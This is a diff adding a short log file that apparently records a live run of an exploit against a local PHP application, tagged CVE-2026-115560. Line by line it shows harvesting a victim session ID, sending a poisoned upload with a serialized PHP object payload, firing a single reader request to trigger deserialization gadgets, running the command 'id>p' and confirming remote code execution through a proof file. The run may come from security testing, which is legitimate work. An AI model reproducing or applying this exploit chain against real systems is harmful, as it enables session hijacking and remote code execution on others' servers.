@@ -1,0 +1,9 @@
+[14:18:22] target=http://localhost:18113/ stage=3 cmd='id>p' log=live_run_20261027_141822.log
+[14:18:22] [preflight] GET / -> HTTP/1.1 200 OK (7 bytes)
+[14:18:22] [*] target PHP version = 8.5.12 (informational — this mode is config-driven, not leak-driven)
+[14:18:22] [115560] victim sid harvested from /upload_dir/prefs.php: 23e07d5b…
+[14:18:22] [115560] poisoned upload -> /upload_dir/index.php (4MB declared, 512KB sent; key=k|a:1:{i:0;O:4:"RceG":0:…)
+[14:18:24] [115560] firing single reader request -> /rce_reader.php (no retries — a failed decode wipes the poisoned state)
+[14:18:24] [115560] reader: HTTP/1.1 200 OK [decode-failure warning seen — chain reached the decode path; gadget magic methods fired]
+[14:18:24] [115560] proof GET /pwned_115560 -> HTTP/1.1 200 OK (MATCH for 'uid=')
+[14:18:24] === CVE-2026-115560 RCE CONFIRMED (proof artifact matches) ===
